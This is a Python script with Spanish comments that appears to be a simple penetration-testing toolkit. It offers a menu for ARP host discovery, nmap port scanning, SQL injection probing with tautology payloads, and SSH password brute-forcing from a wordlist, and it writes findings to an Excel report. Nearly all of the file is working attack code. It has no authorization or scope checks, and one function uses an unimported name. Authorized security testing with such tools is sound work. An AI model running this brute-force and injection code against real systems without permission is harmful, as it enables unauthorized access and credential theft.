import nmap
import requests
from scapy.all import ARP, Ether, srp, ICMP, sr1
import paramiko  # Para SSH
import openpyxl  # Para generar archivos Excel
import hashlib

# Funciones de Pruebas de Penetración

def scan_network(ip_range):
    """Escanea la red para encontrar dispositivos activos."""
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    print(f"Escaneando la red en el rango: {ip_range}...")
    result = srp(packet, timeout=2, verbose=False)[0]

    devices = []
    for sent, received in result:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})

    return devices

def ping_device(ip):
    """Verifica la conectividad de un dispositivo utilizando ping."""
    icmp_packet = IP(dst=ip)/ICMP()
    response = sr1(icmp_packet, timeout=1, verbose=False)
    return response is not None

def scan_ports(target):
    """Escanea puertos en un dispositivo objetivo."""
    nm = nmap.PortScanner()
    nm.scan(target, '1-1024')
    ports_info = []

    for proto in nm[target].all_protocols():
        lport = nm[target][proto].keys()
        for port in sorted(lport):
            ports_info.append({'port': port, 'state': nm[target][proto][port]['state'],
                               'service': nm[target][proto][port].get('name', 'unknown')})
    return ports_info

def check_sql_injection(url):
    """Prueba de inyección SQL."""
    payloads = ["' OR '1'='1' -- ", "' OR '1'='2' -- "]
    results = []
    for payload in payloads:
        response = requests.get(url + payload)
        vulnerable = "sql syntax" in response.text.lower() or response.status_code == 500
        results.append({'payload': payload, 'vulnerable': vulnerable})
    return results


def brute_force_ssh(ip, username, password_list):
    """Intenta un ataque de fuerza bruta en SSH."""
    for password in password_list:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, username=username, password=password, timeout=3)
            print(f"¡Acceso SSH exitoso en {ip} con la contraseña: {password}!")
            return password
        except paramiko.AuthenticationException:
            continue
        except Exception as e:
            print(f"Error: {str(e)}")
            break

def save_results_to_excel(devices, ports_info, sql_results, ssh_result):
    """Guarda resultados en un archivo Excel."""
    workbook = openpyxl.Workbook()
    sheet = workbook.active
    sheet.title = "Resultados de Pentesting"

    # Dispositivos encontrados
    sheet.append(["Dispositivo IP", "Dispositivo MAC"])
    for device in devices:
        sheet.append([device['ip'], device['mac']])

    # Espacio entre secciones
    sheet.append([])

    # Puertos encontrados
    sheet.append(["Puerto", "Estado", "Servicio"])
    for port in ports_info:
        sheet.append([port['port'], port['state'], port['service']])

    # Espacio entre secciones
    sheet.append([])

    # Resultados de inyección SQL
    sheet.append(["Payload SQL", "Vulnerabilidad SQL Detectada"])
    for result in sql_results:
        sheet.append([result['payload'], result['vulnerable']])

    # Espacio entre secciones
    sheet.append([])

    # Resultado de SSH
    if ssh_result:
        sheet.append(["Ataque de Fuerza Bruta SSH", "Contraseña Encontrada"])
        sheet.append([ssh_result])
    else:
        sheet.append(["Ataque de Fuerza Bruta SSH", "No se encontró contraseña"])

    workbook.save("pentesting_report.xlsx")
    print("Resultados guardados en pentesting_report.xlsx.")

def display_menu():
    """Muestra las opciones del menú."""
    print("\nOpciones de Pentesting:")
    print("1. Escanear red")
    print("2. Escanear puertos")
    print("3. Verificar inyecciones SQL")
    print("4. Realizar ataque de fuerza bruta en SSH")
    print("5. Salir")

# Main
if __name__ == "__main__":
    devices = []
    ports_info = []
    sql_results = []
    ssh_result = None

    while True:
        display_menu()
        choice = input("Ingrese su opción: ")

        if choice == '1':
            ip_range = input("Introduzca el rango de IP a escanear (ej. 192.168.1.1/24): ")
            devices = scan_network(ip_range)
            for device in devices:
                print(f"Dispositivo encontrado: IP: {device['ip']}, MAC: {device['mac']}")

        elif choice == '2':
            ip = input("Ingrese la dirección IP a escanear: ")
            ports_info = scan_ports(ip)
            print("Puertos encontrados:")
            for port in ports_info:
                print(f"Puerto: {port['port']} | Estado: {port['state']} | Servicio: {port['service']}")

        elif choice == '3':
            url = input("Ingrese la URL a comprobar: ")
            sql_results = check_sql_injection(url)
            for result in sql_results:
                status = "Vulnerable" if result['vulnerable'] else "No Vulnerable"
                print(f"Payload: {result['payload']} | Estado: {status}")

        elif choice == '4':
            ip = input("Ingrese la dirección IP para SSH: ")
            username = input("Ingrese el nombre de usuario: ")
            password_file = input("Ingrese la ruta al archivo de contraseñas: ")
            with open(password_file, 'r') as pf:
                passwords = pf.read().splitlines()
            ssh_result = brute_force_ssh(ip, username, passwords)

        elif choice == '5':
            save_results_to_excel(devices, ports_info, sql_results, ssh_result)
            print("Saliendo del programa.")
            break

        else:
            print("Opción no válida.")